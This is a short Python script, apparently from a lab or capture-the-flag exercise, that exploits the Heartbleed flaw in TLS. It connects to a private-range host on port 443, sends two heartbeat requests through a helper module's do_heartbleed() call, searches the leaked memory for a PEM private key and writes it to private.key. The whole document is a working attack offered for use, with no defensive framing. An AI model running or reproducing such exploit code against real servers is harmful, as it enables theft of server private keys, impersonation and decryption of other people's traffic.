from tls import TLSConnection
from time import sleep
from re import search

def main() -> None:
    response = ''

    # create connection to 10.0.23.19 on port 443 and do a full handshake
    connection = TLSConnection('10.0.23.19', 443)
    connection.do_handshake()

    # send two Heartbeat request packets and append the response data from both of them
    for _ in range(2):
        sleep(1)
        response += connection.do_heartbleed()

    # match the strings '-----BEGIN PRIVATE KEY' and 'END PRIVATE KEY-----', as well as everything in between of them (.*)
    private_key = search(r'-----BEGIN PRIVATE KEY.*END PRIVATE KEY-----', response)

    # if the private key is successfully exfiltrated and extracted, save it into a file
    if private_key:
        save_key(private_key.group(0))
        print('[+] The private key has successfully been exfiltrated and saved in a file named private.key.')

def save_key(key: str) -> None:
    # save the exfiltrated private key into the 'private.key' file
    with open('private.key', 'w+') as fout:
        fout.write(key)

if __name__ == '__main__':
    main()
